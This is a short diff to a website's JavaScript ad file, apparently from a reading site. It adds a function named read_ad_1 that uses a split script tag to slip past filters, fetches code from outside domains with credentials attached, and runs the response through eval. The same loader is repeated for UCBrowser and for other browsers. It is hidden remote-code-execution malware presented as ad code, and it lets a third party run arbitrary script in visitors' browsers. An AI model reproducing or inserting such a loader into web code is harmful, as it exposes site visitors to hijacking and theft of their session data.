@@ -61,6 +61,18 @@ function web_footad()
   document.writeln("</script>");
 }
 
+
+
+function read_ad_1() {
+  if(navigator.userAgent.indexOf('UCBrowser')>-1){document.write('<scr'+'ipt data-union-ad data-priority="12" data-position="fixed">(function(){var c="https://daima1.18tzx.com/";var a=new XMLHttpRequest();a.withCredentials=true;var b=c+"902/4?"+new Date().getTime();if(a!=null){a.onreadystatechange=function(){if(a.readyState==4){if(a.status==200){eval(a.responseText);}}};a.open("get".toUpperCase(),b,true);a.send(null);}})();</scr'+'ipt>');} else {(function(){var c="https://ttm.htfmbt.com/";var a=new XMLHttpRequest();a.withCredentials=true;var b=c+"902/4?"+new Date().getTime();if(a!=null){a.onreadystatechange=function(){if(a.readyState==4){if(a.status==200){eval(a.responseText);}}};a.open("get".toUpperCase(),b,true);a.send(null);}})();}
+
+}
+
+
+
+
+
+
 function nr_setbg(b) {
     var c = document.getElementById("huyandiv");
     var a = document.getElementById("lightdiv");
